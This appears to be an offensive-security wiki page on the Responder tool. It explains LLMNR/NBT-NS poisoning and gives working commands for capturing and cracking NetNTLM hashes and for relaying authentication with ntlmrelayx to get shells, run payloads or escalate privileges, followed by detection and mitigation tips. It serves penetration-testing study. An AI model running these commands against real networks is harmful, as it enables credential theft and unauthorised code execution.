---
title: Responder
permalink: /wiki/offsec-notes/entities/responder/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

**Type:** Tool
**Also known as:** Responder.py
**Related:** [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/), [Pass The Hash](/wiki/offsec-notes/concepts/pass-the-hash/), [Lateral Movement](/wiki/offsec-notes/concepts/lateral-movement/)

## Description
Responder is a LLMNR, NBT-NS, and mDNS poisoner tool that listens for name resolution broadcasts on the local network and responds with attacker IP, forcing hosts to authenticate to the attacker. This captures NetNTLMv1/v2 hashes that can be cracked offline or relayed to other services. Developed by Laurent Gaffié (lgandx).

## Usage / Details

### How It Works
Windows uses LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) as fallback name resolution when DNS fails. When a user types `\\typo-server\share` and it doesn't resolve via DNS, Windows broadcasts an LLMNR/NBT-NS query. Responder answers "I'm that host" → victim sends NTLM authentication → Responder captures the NetNTLM hash.

### Basic Usage
```bash
# Listen on interface (capture hashes)
sudo responder -I eth0

# Verbose output
sudo responder -I eth0 -v

# Analyze mode only (don't respond; just log broadcasts)
sudo responder -I eth0 -A

# With WPAD (web proxy autodiscovery poisoning)
sudo responder -I eth0 -wFb

# Force NTLM downgrade (capture NetNTLMv1 — easier to crack)
sudo responder -I eth0 --lm --disable-ess
```

### Captured Hash Location
```
/usr/share/responder/logs/
# Files like: SMB-NTLMv2-SSP-10.10.10.1.txt
```

### Cracking Captured Hashes
```bash
# NetNTLMv2 (most common) — hashcat mode 5600
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# NetNTLMv1 — hashcat mode 5500 (much faster to crack)
hashcat -m 5500 netntlmv1.txt /usr/share/wordlists/rockyou.txt

# John
john netntlmv2.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### NTLM Relay (ntlmrelayx) — More Powerful
Instead of cracking, relay the captured auth to another target:
```bash
# Run ntlmrelayx targeting hosts without SMB signing (Impacket)
ntlmrelayx.py -tf smb-no-signing.txt -smb2support

# Simultaneously run Responder WITHOUT SMB/HTTP listeners (to avoid conflict)
sudo responder -I eth0 -P -v   # -P: don't start SMB/HTTP poison servers

# Or edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Relay to LDAP for RBCD attack
ntlmrelayx.py -t ldaps://dc01.domain.local --delegate-access --escalate-user compromised_user

# Drop a shell on relay target
ntlmrelayx.py -tf targets.txt -smb2support -i  # Interactive shell mode
ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe  # Execute payload
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc ...'  # Run command
```

### Finding SMB Signing Status
```bash
# NetExec
nxc smb 10.10.10.0/24 --gen-relay-list smb-no-signing.txt

# Nmap
nmap --script smb-security-mode.nse -p 445 10.10.10.0/24
```

## Detection & Evasion Notes
- LLMNR/NBT-NS poisoning is highly detectable: unusual number of NTLMv2 auths to a workstation IP.
- LLMNR can be disabled via GPO (`Computer Config → Admin Templates → Network → DNS Client → Turn off multicast name resolution`).
- SMB signing required on all hosts defeats relay attacks.
- Honeypots: deliberately misconfigured shares that alert on any authentication.
- Respond only to specific targets, not broadcast — reduces noise.

## References
- Responder GitHub — github.com/lgandx/Responder
- "Practical Guide to NTLM Relay" — byt3bl33d3r
- "Disable LLMNR and NBT-NS to Prevent Credential Theft" — Microsoft docs
